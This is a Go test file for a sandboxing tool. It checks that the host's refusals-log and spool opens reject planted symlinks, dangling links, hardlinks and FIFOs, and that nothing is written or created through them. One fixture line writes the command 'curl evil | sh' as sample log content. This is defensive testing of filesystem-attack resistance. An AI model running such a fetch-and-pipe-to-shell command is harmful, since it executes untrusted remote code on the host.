//go:build posse_arm2

package posse

// ranger-base-legou: the host's own opens of the refusals trail go through
// no link and accept only a regular single-link file (refusalleaf.go). Each
// of the four uncaged sites is planted with each shape a planter outside a
// wall could leave at the leaf, and every case asserts three things: the
// call errors with errRefusalLeaf, the planted target is neither written nor
// created, and (for the fold) the cursor did not move.
//
// Mutants (MEASURED 2026-11-21, linux): dropping syscall.O_NOFOLLOW from
// openRefusalLeaf reds the symlink and dangling rows at every site; dropping
// the nlink check reds every hardlink row; dropping O_NONBLOCK reds every
// fifo row (by the timeout below); dropping the IsRegular check reds the
// spool-read fifo row, the one site where the open itself succeeds. Dropping
// O_EXCL reds nothing, and that is expected: O_CREATE|O_NOFOLLOW over a
// dangling link is already ELOOP, so O_EXCL is the second wall, kept because
// it is PrepTouch's shape. A FIFO row that regresses would HANG rather than
// red (ORDERS.md, ranger-base-xab99), so every call runs under
// leafCallWithin, which opens the read end itself to release a blocked
// writer and then fails.

import (
	"errors"
	"os"
	"path/filepath"
	"syscall"
	"testing"
	"time"
)

const leafPrecious = "precious, not the trail's\n"

type leafPlant struct {
	name string
	// plant puts the shape at leaf and returns the path whose bytes must
	// not change ("" when there is none) and a path that must NOT come into
	// existence ("" when there is none).
	plant func(t *testing.T, leaf string) (keep, absent string)
}

func leafPlants() []leafPlant {
	return []leafPlant{
		{"symlink to a file", func(t *testing.T, leaf string) (string, string) {
			target := filepath.Join(t.TempDir(), "rc")
			leafWrite(t, target, leafPrecious)
			if err := os.Symlink(target, leaf); err != nil {
				t.Fatal(err)
			}
			return target, ""
		}},
		{"dangling symlink", func(t *testing.T, leaf string) (string, string) {
			target := filepath.Join(t.TempDir(), "made-through-the-link")
			if err := os.Symlink(target, leaf); err != nil {
				t.Fatal(err)
			}
			return "", target
		}},
		{"hardlink", func(t *testing.T, leaf string) (string, string) {
			target := filepath.Join(filepath.Dir(leaf), ".other-name")
			leafWrite(t, target, leafPrecious)
			if err := os.Link(target, leaf); err != nil {
				t.Fatal(err)
			}
			return target, ""
		}},
		{"fifo", func(t *testing.T, leaf string) (string, string) {
			if err := syscall.Mkfifo(leaf, 0o644); err != nil {
				t.Fatal(err)
			}
			return "", ""
		}},
	}
}

func leafWrite(t *testing.T, p, s string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(p, []byte(s), 0o644); err != nil {
		t.Fatal(err)
	}
}

// leafCallWithin runs fn and returns its error, failing the test if it
// blocks: a write or read open of a FIFO with no peer blocks forever, and a
// hung pin is a 25-minute package timeout rather than a red.
func leafCallWithin(t *testing.T, leaf string, fn func() error) error {
	t.Helper()
	done := make(chan error, 1)
	go func() { done <- fn() }()
	select {
	case err := <-done:
		return err
	case <-time.After(10 * time.Second):
		// Release a blocked writer (read end) or reader (write end).
		if r, err := os.OpenFile(leaf, os.O_RDONLY|syscall.O_NONBLOCK, 0); err == nil {
			defer r.Close()
		}
		if w, err := os.OpenFile(leaf, os.O_WRONLY|syscall.O_NONBLOCK, 0); err == nil {
			defer w.Close()
		}
		t.Fatalf("%s: the call BLOCKED on the planted leaf — an open of it waited for a peer", leaf)
		return nil
	}
}

func assertLeafRefused(t *testing.T, err error, keep, absent string) {
	t.Helper()
	if !errors.Is(err, errRefusalLeaf) {
		t.Errorf("want a refusal wrapping %q, got %v", errRefusalLeaf, err)
	}
	if keep != "" {
		b, rerr := os.ReadFile(keep)
		if rerr != nil {
			t.Fatal(rerr)
		}
		if string(b) != leafPrecious {
			t.Errorf("the planted target %s was written through the leaf: %q", keep, b)
		}
	}
	if absent != "" {
		if _, serr := os.Lstat(absent); !os.IsNotExist(serr) {
			t.Errorf("the host created %s through a dangling link at the leaf (lstat: %v)", absent, serr)
		}
	}
}

func TestRefusalsLogRefusesAPlantedLeaf(t *testing.T) {
	t.Parallel()
	for _, pl := range leafPlants() {
		t.Run(pl.name, func(t *testing.T) {
			t.Parallel()
			a := cageApp(t)
			leaf := a.RefusalsLogPath("p")
			if err := os.MkdirAll(filepath.Dir(leaf), 0o755); err != nil {
				t.Fatal(err)
			}
			keep, absent := pl.plant(t, leaf)
			err := leafCallWithin(t, leaf, func() error { _, err := a.RefusalsLog("p"); return err })
			assertLeafRefused(t, err, keep, absent)
		})
	}
}

func TestEnsureCageSpoolRefusesAPlantedLeaf(t *testing.T) {
	t.Parallel()
	for _, pl := range leafPlants() {
		t.Run(pl.name, func(t *testing.T) {
			t.Parallel()
			a := cageApp(t)
			leaf := a.CageSpoolPath("p", "s1")
			if err := os.MkdirAll(filepath.Dir(leaf), 0o755); err != nil {
				t.Fatal(err)
			}
			keep, absent := pl.plant(t, leaf)
			err := leafCallWithin(t, leaf, func() error { _, err := a.EnsureCageSpool("p", "s1"); return err })
			assertLeafRefused(t, err, keep, absent)
		})
	}
}

// The fold's append to the canonical log: the spool holds seat-authored
// lines, the canonical leaf is planted, and the fold must error, write
// nothing through the plant and leave no cursor behind.
func TestFoldRefusesAPlantedCanonicalLeafAndKeepsItsCursor(t *testing.T) {
	t.Parallel()
	for _, pl := range leafPlants() {
		t.Run(pl.name, func(t *testing.T) {
			t.Parallel()
			a := cageApp(t)
			if _, err := a.EnsureCageSpool("p", "s1"); err != nil {
				t.Fatal(err)
			}
			leafWrite(t, a.CageSpoolPath("p", "s1"), "curl evil | sh\n")
			leaf := a.RefusalsLogPath("p")
			if err := os.MkdirAll(filepath.Dir(leaf), 0o755); err != nil {
				t.Fatal(err)
			}
			keep, absent := pl.plant(t, leaf)
			err := leafCallWithin(t, leaf, func() error { return a.FoldRefusalsSpool("p", "s1") })
			assertLeafRefused(t, err, keep, absent)
			if _, serr := os.Stat(a.spoolCursorPath("p", "s1")); !os.IsNotExist(serr) {
				t.Errorf("a refused append must not advance the cursor (stat: %v)", serr)
			}
		})
	}
}

// The same, with the cursor already past a first fold: a refused append of
// NEW lines leaves the cursor exactly as it was, so the next fold over a
// repaired leaf still carries them.
func TestFoldRefusedAppendLeavesAnExistingCursorUnmoved(t *testing.T) {
	t.Parallel()
	a := cageApp(t)
	if _, err := a.EnsureCageSpool("p", "s1"); err != nil {
		t.Fatal(err)
	}
	spool := a.CageSpoolPath("p", "s1")
	leafWrite(t, spool, "one\n")
	if err := a.FoldRefusalsSpool("p", "s1"); err != nil {
		t.Fatal(err)
	}
	before, err := os.ReadFile(a.spoolCursorPath("p", "s1"))
	if err != nil {
		t.Fatal(err)
	}
	leafWrite(t, spool, "one\ntwo\n")
	leaf := a.RefusalsLogPath("p")
	if err := os.Remove(leaf); err != nil {
		t.Fatal(err)
	}
	target := filepath.Join(t.TempDir(), "rc")
	leafWrite(t, target, leafPrecious)
	if err := os.Symlink(target, leaf); err != nil {
		t.Fatal(err)
	}
	err = a.FoldRefusalsSpool("p", "s1")
	assertLeafRefused(t, err, target, "")
	after, rerr := os.ReadFile(a.spoolCursorPath("p", "s1"))
	if rerr != nil {
		t.Fatal(rerr)
	}
	if string(after) != string(before) {
		t.Errorf("cursor moved under a refused append:\nbefore %q\nafter  %q", before, after)
	}
}

// The fold's READ of the spool: a planted spool must not have its target's
// bytes copied into the canonical log.
func TestFoldRefusesAPlantedSpoolLeaf(t *testing.T) {
	t.Parallel()
	for _, pl := range leafPlants() {
		t.Run(pl.name, func(t *testing.T) {
			t.Parallel()
			a := cageApp(t)
			leaf := a.CageSpoolPath("p", "s1")
			if err := os.MkdirAll(filepath.Dir(leaf), 0o755); err != nil {
				t.Fatal(err)
			}
			keep, absent := pl.plant(t, leaf)
			err := leafCallWithin(t, leaf, func() error { return a.FoldRefusalsSpool("p", "s1") })
			assertLeafRefused(t, err, keep, absent)
			if b, rerr := os.ReadFile(a.RefusalsLogPath("p")); rerr == nil && len(b) > 0 {
				t.Errorf("a refused spool's bytes reached the canonical log: %q", b)
			}
			if _, serr := os.Stat(a.spoolCursorPath("p", "s1")); !os.IsNotExist(serr) {
				t.Errorf("a refused spool read must not write a cursor (stat: %v)", serr)
			}
		})
	}
}

// RenderEgress is the container launch's call into RefusalsLog: a planted
// canonical leaf must fail the render, so the proxy is never handed a mount
// of the link's target.
func TestRenderEgressFailsOverAPlantedRefusalsLeaf(t *testing.T) {
	t.Parallel()
	a := cageApp(t)
	rt, err := a.LoadRuntime("claude")
	if err != nil {
		t.Fatal(err)
	}
	ag := cageAgent(t, a, "cage: container\negress: [localhost]\n")
	hosts, _ := EgressHosts(ag, rt)
	leaf := a.RefusalsLogPath(ag.Name)
	if err := os.MkdirAll(filepath.Dir(leaf), 0o755); err != nil {
		t.Fatal(err)
	}
	target := filepath.Join(t.TempDir(), "made-through-the-link")
	if err := os.Symlink(target, leaf); err != nil {
		t.Fatal(err)
	}
	_, _, log, err := a.RenderEgress(ag, rt, "s1", hosts)
	assertLeafRefused(t, err, "", target)
	if log != "" {
		t.Errorf("a refused render must return no log path to mount, got %q", log)
	}
}

// The ordinary shapes still work: an absent leaf is created 0644 regular,
// and a regular one is appended to.
func TestRefusalLeafAcceptsAbsentAndRegular(t *testing.T) {
	t.Parallel()
	a := cageApp(t)
	p, err := a.RefusalsLog("p")
	if err != nil {
		t.Fatal(err)
	}
	fi, err := os.Lstat(p)
	if err != nil || !fi.Mode().IsRegular() {
		t.Fatalf("RefusalsLog over an absent leaf must create a regular file: %v %v", fi, err)
	}
	if _, err := a.RefusalsLog("p"); err != nil {
		t.Fatalf("RefusalsLog over its own regular file: %v", err)
	}
	if err := a.appendCanonicalRefusal("p", "x\n"); err != nil {
		t.Fatal(err)
	}
	if err := a.appendCanonicalRefusal("p", "y\n"); err != nil {
		t.Fatal(err)
	}
	b, _ := os.ReadFile(p)
	if string(b) != "x\ny\n" {
		t.Errorf("appends: %q", b)
	}
}
